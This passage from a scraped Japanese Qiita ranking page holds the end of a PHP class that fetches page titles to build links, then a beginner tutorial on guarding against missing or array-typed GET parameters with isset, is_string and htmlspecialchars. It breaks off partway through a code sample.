                            <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
                            <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">step</span>   <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_FINISHED</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">replace</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span> <span class="k">as</span> <span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">string</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$replace</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span>
                <span class="s1">'&lt;a href="%s" target="_blank"&gt;%s&lt;/a&gt;'</span><span class="p">,</span>
                <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">string</span><span class="p">,</span>
                <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span>
            <span class="p">);</span>
            <span class="nv">$offset</span> <span class="o">=</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">offset</span> <span class="o">+</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">offset</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="nb">substr_replace</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span><span class="p">,</span> <span class="nv">$replace</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">,</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">length</span><span class="p">);</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">offset</span> <span class="o">+=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$replace</span><span class="p">)</span> <span class="o">-</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">length</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">writeHeaders</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">path</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">query</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$path</span> <span class="o">.=</span> <span class="s1">'?'</span> <span class="o">.</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$headers</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
                <span class="s2">"GET </span><span class="si">{</span><span class="nv">$path</span><span class="si">}</span><span class="s2"> HTTP/1.1"</span><span class="p">,</span>
                <span class="s2">"Host: </span><span class="si">{</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">host</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span>
                <span class="s1">'Connection: Close'</span><span class="p">,</span>
                <span class="s1">'User-Agent: '</span> <span class="o">.</span> 
                    <span class="s1">'Mozilla/5.0 (Windows NT 6.1) '</span> <span class="o">.</span>
                    <span class="s1">'AppleWebKit/537.36 (KHTML, like Gecko) '</span> <span class="o">.</span>
                    <span class="s1">'Chrome/28.0.1500.63 Safari/537.36'</span>
                <span class="p">,</span>
                <span class="s1">'Accept: '</span> <span class="o">.</span>
                    <span class="s1">'text/html,'</span> <span class="o">.</span> 
                    <span class="s1">'application/xhtml+xml,'</span> <span class="o">.</span>
                    <span class="s1">'application/xml'</span> <span class="o">.</span>
                    <span class="s1">';q=0.9,*/*;q=0.8'</span>
                <span class="p">,</span>
                <span class="s1">'Accept-Language: '</span> <span class="o">.</span>
                    <span class="s1">'ja,en-us;q=0.7,en;q=0.3'</span>
                <span class="p">,</span>
                <span class="s1">''</span><span class="p">,</span>
                <span class="s1">''</span><span class="p">,</span>
            <span class="p">);</span>
            <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span><span class="p">,</span> <span class="mi">8192</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">step</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_READ_HEADERS</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">readHeaders</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$items</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$items</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="nv">$items</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
                <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">step</span>   <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_READ_BODY</span><span class="p">;</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">.=</span> <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="mi">8192</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">readBody</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$buffer</span> <span class="o">=</span> <span class="nb">mb_convert_encoding</span><span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">,</span> <span class="s1">'ASCII,JIS,UTF-8,CP51932,SJIS-win'</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'@&lt;title&gt;(.*?)&lt;/title&gt;@i'</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">step</span>   <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_FINISHED</span><span class="p">;</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">.=</span> <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="mi">8192</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">createSocket</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">static</span> <span class="nv">$flag</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$flag</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$flag</span> <span class="o">=</span> <span class="k">PHP_OS</span> <span class="o">===</span> <span class="s1">'WINNT'</span> <span class="o">||</span> <span class="nb">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">'5.3.1'</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">scheme</span> <span class="o">===</span> <span class="s1">'https'</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> 
                <span class="nv">$flag</span> <span class="o">?</span> 
                <span class="o">@</span><span class="nb">fsockopen</span><span class="p">(</span><span class="s2">"ssl://</span><span class="si">{</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">host</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">port</span><span class="p">)</span> <span class="o">:</span>
                <span class="o">@</span><span class="nb">stream_socket_client</span><span class="p">(</span><span class="s2">"ssl://</span><span class="si">{</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">port</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$dummy</span><span class="p">,</span> <span class="nv">$dummy</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>
            <span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span>
                <span class="o">@</span><span class="nb">stream_socket_client</span><span class="p">(</span><span class="s2">"tcp://</span><span class="si">{</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">port</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$dummy</span><span class="p">,</span> <span class="nv">$dummy</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>
            <span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>   

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">getRegex</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span>  
            <span class="s1">'`https?+:(?://(?:(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]'</span> <span class="o">.</span>
            <span class="s1">'|[!$&amp;-,:;=])*+@)?+(?:\[(?:(?:[0-9a-f]{1,4}:){6}(?:'</span> <span class="o">.</span>
            <span class="s1">'[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2'</span> <span class="o">.</span>
            <span class="s1">'[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
            <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
            <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|::(?:[0-9a-f'</span> <span class="o">.</span>
            <span class="s1">']{1,4}:){5}(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1'</span> <span class="o">.</span>
            <span class="s1">'-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{'</span> <span class="o">.</span>
            <span class="s1">'2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\\'</span> <span class="o">.</span>
            <span class="s1">'d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])'</span> <span class="o">.</span>
            <span class="s1">')|(?:[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:){4}(?:[0-'</span> <span class="o">.</span>
            <span class="s1">'9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2[0-'</span> <span class="o">.</span>
            <span class="s1">'4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-'</span> <span class="o">.</span>
            <span class="s1">'5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d'</span> <span class="o">.</span>
            <span class="s1">'|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-f]{'</span> <span class="o">.</span>
            <span class="s1">'1,4}:)?+[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:){3}(?:'</span> <span class="o">.</span>
            <span class="s1">'[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2'</span> <span class="o">.</span>
            <span class="s1">'[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
            <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
            <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-'</span> <span class="o">.</span>
            <span class="s1">'f]{1,4}:){0,2}[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:)'</span> <span class="o">.</span>
            <span class="s1">'{2}(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\\'</span> <span class="o">.</span>
            <span class="s1">'d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4'</span> <span class="o">.</span>
            <span class="s1">']\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5'</span> <span class="o">.</span>
            <span class="s1">'])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:'</span> <span class="o">.</span>
            <span class="s1">'[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?+::[0-9a-f]{1,4'</span> <span class="o">.</span>
            <span class="s1">'}:(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d'</span> <span class="o">.</span>
            <span class="s1">'{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]'</span> <span class="o">.</span>
            <span class="s1">'\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]'</span> <span class="o">.</span>
            <span class="s1">')\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:['</span> <span class="o">.</span>
            <span class="s1">'0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?+::(?:[0-9a-f]{1'</span> <span class="o">.</span>
            <span class="s1">',4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
            <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
            <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\\'</span> <span class="o">.</span>
            <span class="s1">'d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-f]{1,4}:){'</span> <span class="o">.</span>
            <span class="s1">'0,5}[0-9a-f]{1,4})?+::[0-9a-f]{1,4}|(?:(?:[0-9a-f]'</span> <span class="o">.</span>
            <span class="s1">'{1,4}:){0,6}[0-9a-f]{1,4})?+::|v[0-9a-f]++\.[!$&amp;-.'</span> <span class="o">.</span>
            <span class="s1">'0-;=_a-z~]++)\]|(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0'</span> <span class="o">.</span>
            <span class="s1">'-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\\'</span> <span class="o">.</span>
            <span class="s1">'d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|'</span> <span class="o">.</span>
            <span class="s1">'1\d{2}|2[0-4]\d|25[0-5])|(?:[-.0-9_a-z~]|%[0-9a-f]'</span> <span class="o">.</span>
            <span class="s1">'[0-9a-f]|[!$&amp;-,;=])*+)(?::\d*+)?+(?:/(?:[-.0-9_a-z'</span> <span class="o">.</span>
            <span class="s1">'~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+)*+|/(?:(?:[-.0'</span> <span class="o">.</span>
            <span class="s1">'-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])++(?:/(?:[-'</span> <span class="o">.</span>
            <span class="s1">'.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+)*+)?+|'</span> <span class="o">.</span>
            <span class="s1">'(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])++(?'</span> <span class="o">.</span>
            <span class="s1">':/(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+'</span> <span class="o">.</span>
            <span class="s1">')*+)?+(?:\?+(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;'</span> <span class="o">.</span>
            <span class="s1">'-,/:;=?+@])*+)?+(?:#(?:[-.0-9_a-z~]|%[0-9a-f][0-9a'</span> <span class="o">.</span>
            <span class="s1">'-f]|[!$&amp;-,/:;=?+@])*+)?+`i'</span>
        <span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />57位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>14</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/f298828002bbc488fe89">【PHP入門講座】 想定外の入力への対応</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-26 01:16:14</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-d5724d1fba5b9eb74b6b">目次に戻る</a>
</h3>

<h1>
<span id="想定外の入力でエラーが発生するケース" class="fragment"></span><a href="#%E6%83%B3%E5%AE%9A%E5%A4%96%E3%81%AE%E5%85%A5%E5%8A%9B%E3%81%A7%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%99%E3%82%8B%E3%82%B1%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>想定外の入力でエラーが発生するケース</h1>

<p>まずは名前を「test」として、 <code>welcome.php</code> を実行しましょう。現在アドレスバーに表示されているURLは</p>

<p><code>http://localhost/welcome.php?my_name=test</code></p>

<p>という形になっていると思います。今回はここから色々いじってみます。</p>

<h2>
<span id="1-welcomephp-に直接アクセスされたとき" class="fragment"></span><a href="#1-welcomephp-%E3%81%AB%E7%9B%B4%E6%8E%A5%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%95%E3%82%8C%E3%81%9F%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a>1. <code>welcome.php</code> に直接アクセスされたとき</h2>

<h3>
<span id="問題の発生" class="fragment"></span><a href="#%E5%95%8F%E9%A1%8C%E3%81%AE%E7%99%BA%E7%94%9F"><i class="fa fa-link"></i></a>問題の発生</h3>

<p>アドレスバーのURLを <code>http://localhost/welcome.php</code> にして直接アクセスしてみましょう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>こんにちは、
Notice: Undefined index: my_name in C:\xampp\htdocs\welcome.php on line 20
さん！
</pre></div></div>

<p>という <strong>Notice(通知)</strong> が発生するはずです。これは7行目、</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>こんにちは、<span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">])</span><span class="cp">?&gt;</span>さん！<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</pre></div></div>

<p>において、 <strong><code>$_GET['my_name']</code> が未定義(Undefined)だよ！</strong> という意味のエラーです。URLからパラメータ <code>my_name</code> を削ってしまったので、この変数が存在しなくなってしまったのです。</p>

<h3>
<span id="解決策" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%96"><i class="fa fa-link"></i></a>解決策</h3>

<p><strong><code>isset</code></strong> 構文を使って、 <code>$_GET['my_name']</code> が定義されているかどうか確認します。ここで <code>if</code> <code>else</code> 文が初登場しますが、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="cm">/* 条件式 */</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 条件式が成立するとき</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// 条件式が成立しないとき</span>
<span class="p">}</span>
</pre></div></div>

<p>というように条件分岐させるためのものだと思ってください。</p>

<p>以下のように <code>welcome.php</code> の書き換えを行ってください。</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// $_GET['my_name'] が定義されているかどうか調べる</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="c1">// 定義されていればそのまま$my_nameに代入</span>
    <span class="nv">$my_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">];</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// 未定義ならば「名無し」として設定</span>
    <span class="nv">$my_name</span> <span class="o">=</span> <span class="s1">'名無し'</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Content-Typeヘッダー送信</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">lang</span><span class="o">=</span><span class="s">"ja"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Hello!!<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>こんにちは、<span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$my_name</span><span class="p">)</span><span class="cp">?&gt;</span>さん！<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<h3>
<span id="確認" class="fragment"></span><a href="#%E7%A2%BA%E8%AA%8D"><i class="fa fa-link"></i></a>確認</h3>

<p>もう一度直接アクセスを行い、「こんにちは、名無しさん！」と表示されれば成功です。</p>

<h2>
<span id="2-welcomephp-に-my_name-が配列として渡されたとき" class="fragment"></span><a href="#2-welcomephp-%E3%81%AB-my_name-%E3%81%8C%E9%85%8D%E5%88%97%E3%81%A8%E3%81%97%E3%81%A6%E6%B8%A1%E3%81%95%E3%82%8C%E3%81%9F%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a>2. <code>welcome.php</code> に <code>my_name</code> が配列として渡されたとき</h2>

<h3>
<span id="問題の発生-1" class="fragment"></span><a href="#%E5%95%8F%E9%A1%8C%E3%81%AE%E7%99%BA%E7%94%9F-1"><i class="fa fa-link"></i></a>問題の発生</h3>

<p>アドレスバーのURLを <code>http://localhost/welcome.php?my_name[a]=b</code> にして直接アクセスしてみましょう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>こんにちは、
Warning: htmlspecialchars() expects parameter 1 to be string, array given in C:\xampp\htdocs\welcome.php on line 7
さん！
</pre></div></div>

<p>という <strong>Warning(警告)</strong> が発生するはずです。これは20行目、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
</pre></div></div>

<p>において、 <strong>第1引数 <code>$str</code> が文字列じゃないといけないのに配列が渡されたよ！</strong> という意味のエラーです。配列に関しては後で詳しく学習しますが、イメージとしては最初述べたように箱に例えるならば <strong>「重箱」</strong> に相当します。この例では、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$str</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'b'</span><span class="p">;</span>
</pre></div></div>

<p>のような形で受け取ってしまっており、 <strong>「str」という箱の中にある「a」という箱の中の値が「b」</strong> という状況を示しています。 <code>htmlspecialchars</code> 関数は配列を処理することが出来ないので、このエラーを発生しています。</p>

<h3>
<span id="解決策-1" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%96-1"><i class="fa fa-link"></i></a>解決策</h3>

<p><strong><code>is_string</code></strong> 関数を使って、 <code>$_GET['my_name']</code> が <strong>文字列(String)</strong> になっているかどうか確認します。</p>

<p>ここで論理演算子 <code>&amp;&amp;</code> が初登場しますが、日本語に直訳すると <strong>「且つ」</strong> を意味します。</p>

<p>以下のように <code>welcome.php</code> の書き換えを行ってください。</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
